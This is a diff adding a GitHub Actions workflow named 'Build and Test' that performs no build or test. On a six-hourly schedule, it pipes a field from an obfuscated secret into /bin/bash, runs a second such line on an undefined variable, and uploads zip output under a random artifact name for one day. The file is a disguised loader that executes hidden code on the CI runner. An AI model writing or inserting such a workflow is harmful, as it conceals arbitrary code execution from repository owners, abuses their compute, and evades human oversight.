@@ -1,0 +1,38 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          juh22: ${{ secrets.juh22 }}
+        run: |
+          printf '%s' "$juh22" | jq -r .ihh160 | /bin/bash
+          printf '%s' "$vasix09970" | jq -r .i1 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2GM8ZKjn
+          path: "*.zip"
+          retention-days: 1
